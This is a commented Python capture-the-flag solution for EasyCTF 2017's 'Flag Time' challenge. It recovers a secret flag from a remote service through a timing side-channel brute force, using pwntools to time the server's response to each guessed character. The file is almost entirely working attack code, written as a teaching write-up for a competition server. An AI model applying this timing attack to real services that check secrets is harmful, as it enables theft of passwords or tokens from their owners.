#####################################
# Flag Time Write-up - EasyCTF 2017 #
#####################################

'''
------------------
Challenge Prompt:
This problem is so easy, it can be solved in a matter of seconds. Connect 
to c1.easyctf.com:12482.
------------------

'''


from pwn import * # We use the pwntools remote networking utilities
import time # We use the time.time() function.

# We can edit our searchspace with this array of characters
charSpace = "qazwsxedcrfvtgbyhnujmikolp1234567890!}{_"

# This variable eventually will contain the flag. We add to it as we find
# the next correct character in the flag.
end = ""

# We use this dictionary to hold time to letter values for comparisons.
timeDict = {}

while True:
	# Every location in the string, we must brute force every character in the 
	# charSpace string that we specify or are given.
	for char in charSpace:
		# This is where we add each new try character to our overall string.
		attempt = end + char

		# We connect to the service and receive the unimportant initial output.
		p = remote('c1.easyctf.com',12482)
		blah = p.recv()
		
		# Here we do the actual timing that we will inspect. We have to recv() the full
		# response or the service will hang. We also want to close the connection because
		# we must reestablish a connection every loop.
		start = time.time()
		p.sendline(attempt)
		result = p.recv()
		finish = time.time()
		p.close()

		# We get the run time, print the output, and add the time,key pair to 
		# our timeDict dictionary.
		runTime = finish - start
		print (result, attempt, runTime)
		timeDict[runTime] = char
	
	# We add the character which took the server the longest to respond to to our overall 
	# flag string we are building. 
	maxTime = max(timeDict)
	nextLetter = timeDict[maxTime]
	end += nextLetter

# Note: The flag is contained in the flag.txt file adjacent to this file in the directory.
